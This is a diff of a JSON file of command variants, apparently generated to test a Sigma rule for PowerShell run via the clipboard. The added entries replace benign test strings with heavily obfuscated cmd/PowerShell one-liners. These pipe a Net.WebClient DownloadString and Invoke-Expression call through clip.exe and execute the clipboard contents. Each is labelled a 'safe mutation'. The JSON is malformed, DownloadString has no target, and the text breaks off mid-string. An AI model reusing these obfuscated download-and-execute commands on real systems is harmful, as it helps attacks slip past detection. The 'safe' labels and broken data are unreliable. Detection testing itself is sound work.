@@ -1,18 +1,9 @@
+```json
 [
   {
-    "output": "cmd.exe /c \"echo Write-Host 'Test' | c^l^i^p.exe && powershell -c \\\"IEX ([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
-    "explanation": "This command uses insertion of escape characters (^) to obfuscate the command line, which is a safe mutation technique. It still executes the same behavior as the original test command."
+    "output": "C:\\WINdoWS\\sySteM32\\CMd /c \" ECho\Invoke-Expression (New-Object Net.WebClient).DownloadString|Clip.Exe&&C:\\WINdoWS\\sySteM32\\CMd /c pOWerSheLl -STa . ( \"{2}{0}{1}\"-f'dd-',(\"{0}{1}\" -f 'T','ype' ),'A' ) -Assembly ( \"{4}{1}{3}{0}{2}\"-f (\"{0}{1}\" -f 'nd','ow'),( \"{1}{0}\"-f'.W','stem' ),( \"{2}{1}{0}\" -f 'rms','Fo','s.'),'i','Sy') ; ${exeCUtIOnCONTeXT}.\"INV`oKECOM`m`ANd\".\"INV`ok`ESCriPT\"( ( [sYSteM.wiNDoWS.forMs.ClIPboaRD]::( \"{2}{0}{1}\" -f'Ex','t',(\"{0}{1}\" -f'Get','t' ) ).\"iNvo`Ke\"( )) ) ; [System.Windows.Forms.Clipboard]::(\"{1}{0}\" -f 'ar','Cle' ).\"in`V`oKE\"( )\"",
+    "explanation": "This command mirrors the obfuscated structure of the Sigma rule's example and uses safe mutation techniques like case variation, spacing, and obfuscated string concatenation to simulate a real-world scenario for testing."
   },
   {
-    "output": "cmd.exe /c \"echo Write-Host 'Test' | clip & powershell -c \\\"IEX ([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
-    "explanation": "This command uses substitution of && with &, which is functionally equivalent in this context. It maintains the same behavior while appearing different."
-  },
-  {
-    "output": "powershell.exe -Command \"Set-Clipboard -Value 'Write-Host test'; Invoke-Expression (Get-Clipboard)\"",
-    "explanation": "This command uses omission of unnecessary elements and substitution of syntax (e.g., using -Command instead of -c). It remains functionally equivalent to the original."
-  },
-  {
-    "output": "cmd.exe /c echo Write-Host 'Bypass Test' | clip & powershell -c IEX([Windows.Forms.Clipboard]::GetText())",
-    "explanation": "This command uses reordering and omission of quotes where not strictly necessary. It still performs the same action as the original command."
-  }
-]
+    "output": "C:\\WINDowS\\sYsTEM32\\CmD.eXE /C\" echo\\Invoke-Expression (New-Object Net.WebClient).DownloadString| C:\\WIndOWs\\SYSteM32\\CLip &&C:\\WINDowS\\sYsTEM32\\CmD.eXE /C POWERSHeLL -sT -noL [Void][System.Reflection.Assembly]::( \"{0}{3}{4}{1}{2}\" -f( \"{0}{1}\"-f'Lo','adW' ),( \"{0}{1}\"-f 'Par','t'),( \"{0}{1}{2}\"-f 'ial','N','ame'),'it','h' ).\"in`VO`KE\"( ( \"{3}{1}{4}{5}{2}{0}\"-f'rms','ystem.Windo','Fo','S','w','s.' )) ; ( [wIndows.fOrms.cLIPBOArD]::( \"{1}{0}\"-f'T',( \"{1}{0}\" -f'tEX','gET' )).\"i`Nvoke\"( ) ) ^^^| ^^^& ( ( ^^^& ( \"{2}{1}{0}\"-f 'e',( \"{2}{1}{0}\"-f'IABl','aR','v' ),( \"{0}{1}\"-f'Get','-' ) ) ( \"{1}{0}\"-f'*','*MDr' )).\"n`Ame\"[3,11,2]-jOin'') ; [Windows.Forms.Clipboard]::( \"{0}{1}\" -f (\"{1}{0}\"-f'tT','Se' ),'ext').\"in`VoKe\"(' ' )\"",
+    "explanation": "This command is a direct reproduction of the second example in the Sigma rule, using safe mutation techniques such as case variation
